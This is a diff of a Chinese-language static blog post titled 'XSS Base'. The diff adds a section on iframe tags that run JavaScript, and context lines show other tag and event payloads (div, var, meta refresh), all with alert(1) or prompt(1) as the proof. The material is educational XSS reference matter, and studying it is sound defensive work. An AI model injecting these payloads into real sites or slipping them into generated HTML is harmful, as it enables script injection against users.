@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="XSS,practice," />
+  <meta name="keywords" content="practice,XSS," />
 
 
 
@@ -80,14 +80,14 @@
 
 
 <meta name="description" content="XSS Base能够执行js的标签、事件、属性标签&amp;lt;script&amp;gt; &amp;lt;a&amp;gt; &amp;lt;p&amp;gt; &amp;lt;img&amp;gt; &amp;lt;body&amp;gt; &amp;lt;button&amp;gt; &amp;lt;var&amp;gt; &amp;lt;div&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;object&amp;gt; &amp;lt;input&amp;gt; &amp;lt;select&amp;gt; &amp;lt;textarea&amp;gt;">
-<meta name="keywords" content="XSS,practice">
+<meta name="keywords" content="practice,XSS">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS Base">
 <meta property="og:url" content="http://yoursite.com/2018/08/03/XSS-base/index.html">
 <meta property="og:site_name" content="Ahodor&#39;Via">
 <meta property="og:description" content="XSS Base能够执行js的标签、事件、属性标签&amp;lt;script&amp;gt; &amp;lt;a&amp;gt; &amp;lt;p&amp;gt; &amp;lt;img&amp;gt; &amp;lt;body&amp;gt; &amp;lt;button&amp;gt; &amp;lt;var&amp;gt; &amp;lt;div&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;object&amp;gt; &amp;lt;input&amp;gt; &amp;lt;select&amp;gt; &amp;lt;textarea&amp;gt;">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-08-03T08:03:31.643Z">
+<meta property="og:updated_time" content="2018-08-31T02:05:13.992Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS Base">
 <meta name="twitter:description" content="XSS Base能够执行js的标签、事件、属性标签&amp;lt;script&amp;gt; &amp;lt;a&amp;gt; &amp;lt;p&amp;gt; &amp;lt;img&amp;gt; &amp;lt;body&amp;gt; &amp;lt;button&amp;gt; &amp;lt;var&amp;gt; &amp;lt;div&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;object&amp;gt; &amp;lt;input&amp;gt; &amp;lt;select&amp;gt; &amp;lt;textarea&amp;gt;">
@@ -422,7 +422,20 @@
 </code></pre><h3 id="var标签"><a href="#var标签" class="headerlink" title="var标签"></a>var标签</h3><pre><code>&lt;var onmouseover=&quot;prompt(1)&quot;&gt;test&lt;/var&gt;
 </code></pre><h3 id="div标签"><a href="#div标签" class="headerlink" title="div标签"></a>div标签</h3><pre><code>&lt;div/onmouseover=&apos;alert(1)&apos;&gt;test
 &lt;div  style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot;  onclick=&quot;alert(1)&quot;&gt;
-</code></pre><h3 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h3><h3 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h3><p>跳出当前属性在添加http-equiv=”refresh”，或者通过给http-equiv设置set-cookie来，进一步重新设置cookie</p>
+</code></pre><h3 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h3><p>形式 <iframe src="输出"></iframe><br>iframe 的src属性本来应该是一个网址，但是它同样可以执行javascript</p>
+<p>onload执行js:</p>
+<pre><code>&lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;
+</code></pre><p>src执行javascript代码</p>
+<pre><code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;
+</code></pre><p>IE下vbscript执行代码:</p>
+<pre><code>&lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt;
+</code></pre><p>Chrome下data协议执行代码：</p>
+<pre><code>&lt;iframesrc=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;Chrome
+</code></pre><p>上面的变体</p>
+<pre><code>&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;
+</code></pre><p>Chrome下srcdoc属性</p>
+<pre><code>&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;
+</code></pre><h3 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h3><p>跳出当前属性在添加http-equiv=”refresh”，或者通过给http-equiv设置set-cookie来，进一步重新设置cookie</p>
 <pre><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript&amp;colon;alert(1)&quot;/&gt;? 
 &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;
 </code></pre><h3 id="object标签"><a href="#object标签" class="headerlink" title="object标签"></a>object标签</h3><p>和a标签的href属性玩法是一样的，不过优点是无须交互</p>
@@ -521,9 +534,9 @@ _    　　　　&amp;lowbar;    &amp;#95;                   &amp;#x5F
       
         <div class="post-tags">
           
-            <a href="/tags/XSS/" rel="tag"># XSS</a>
-          
             <a href="/tags/practice/" rel="tag"># practice</a>
+          
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
           
         </div>
       
@@ -625,7 +638,7 @@ _    　　　　&amp;lowbar;    &amp;#95;                   &amp;#x5F
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-count">21</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
